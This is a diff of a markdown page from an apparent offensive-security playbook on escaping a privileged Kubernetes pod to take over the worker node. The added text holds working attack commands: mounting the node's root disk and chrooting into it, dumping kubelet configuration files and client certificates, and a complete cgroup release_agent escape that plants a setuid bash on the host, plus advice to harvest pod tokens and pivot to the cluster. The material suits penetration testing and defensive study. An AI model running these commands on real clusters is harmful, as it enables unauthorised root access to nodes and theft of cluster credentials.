@@ -1,31 +1,58 @@
 ---
-title: "Privileged pod: escaping to the node from a privileged security context"
-description: "Escaping to a Kubernetes node from a pod whose security context is privileged, which grants all capabilities and host device access, so the pod mounts the node disk or uses the release_agent escape to run as root on the node."
+title: "Privileged pod: node takeover from a privileged security context"
+description: "A pod whose container runs with securityContext.privileged: true receives the full capability set, all host devices, and unconfined seccomp and AppArmor, exactly like a privileged container. From it an attacker mounts the node root disk or uses the cgroup release_agent to run code on the node as root, taking over the worker."
 keywords:
   - privileged pod
-  - securityContext privileged
-  - node escape
-  - pod security
-  - kubernetes escape
+  - securitycontext
+  - node takeover
+  - host disk
+  - release_agent
 ---
 
 # Privileged pod
 
-A pod with `securityContext.privileged: true` is the Kubernetes delivery of the all-in-one privileged container: every capability, all host devices, and no default confinement. From such a pod the node is one step away, by mounting its disk or using the cgroup escape. Getting the pod scheduled is the real gate, which is Pod Security admission.
+A pod container with `securityContext.privileged: true` is the Kubernetes equivalent of `docker run --privileged`: it holds the full Linux capability set, can use every host device, and runs with unconfined seccomp and AppArmor. Everything on the runtime-agnostic privileged-container page applies, and the escape is the same, now landing on the Kubernetes worker node.
+
+Confirm the privilege and pick a route:
 
 ```bash
-# A privileged pod spec; schedule it where admission allows
-kubectl run pwn --image=alpine --privileged --command -- sleep 1d
-kubectl exec -it pwn -- sh -c 'fdisk -l; mount /dev/sda1 /mnt 2>/dev/null; chroot /mnt sh'
+grep CapEff /proc/self/status                 # full set (…ffffffff) => privileged
+capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')
+ls /dev | grep -E 'sd|nvme|mem'               # host devices visible
 ```
+
+## Route: mount the node disk
+
+```bash
+fdisk -l 2>/dev/null | grep -E 'Linux|/dev/(sd|nvme|vd)'
+mkdir -p /mnt/node && mount /dev/nvme0n1p1 /mnt/node && chroot /mnt/node sh
+# node root exposes kubelet creds, static pod manifests, and every pod's secrets
+cat /mnt/node/etc/kubernetes/*.conf /mnt/node/var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null
+```
+
+## Route: cgroup release_agent
+
+Where mounting the disk is awkward, the release_agent one-liner runs a payload on the node as root:
+
+```bash
+mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c && mkdir /tmp/c/x
+echo 1 > /tmp/c/x/notify_on_release
+host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+echo "$host/p" > /tmp/c/release_agent
+printf '#!/bin/sh\ncp /bin/bash %s/b; chmod +s %s/b\n' "$host" "$host" > /p && chmod +x /p
+sh -c "echo \$\$ > /tmp/c/x/cgroup.procs"
+```
+
+The mechanism is identical to [cgroups release_agent](../../../container-escape/privileged-configuration/cgroups-release-agent.md).
 
 ## Exploitation notes
 
-- The escape inside the pod is [Privileged flag](../../../container-escape/privileged-configuration/privileged-flag.md); the pod spec just requests it.
-- The barrier is admission: Pod Security Standards at `baseline` or `restricted` reject privileged, so check the namespace's enforcement before assuming it schedules.
-- Obtaining the right to create such a pod is [Pod creation to node](../rbac-privilege-escalation/pod-creation-to-node.md).
+- A privileged pod is a node takeover by construction; `cat /proc/self/uid_map` showing `0 0` confirms node root rather than a remapped identity.
+- Once on the node, harvest the kubelet credentials and every pod's projected token; see [Kubelet credential theft](kubelet-credential-theft.md), then pivot to the cluster.
+- Obtaining a privileged pod in the first place, when you have the RBAC to create pods, is [Pod creation to node](../rbac-privilege-escalation/pod-creation-to-node.md).
 
 ## References
 
+- [BishopFox: bad pods (privileged)](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
 - [Kubernetes: security context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
-- [Kubernetes: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
+- [Trail of Bits: Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
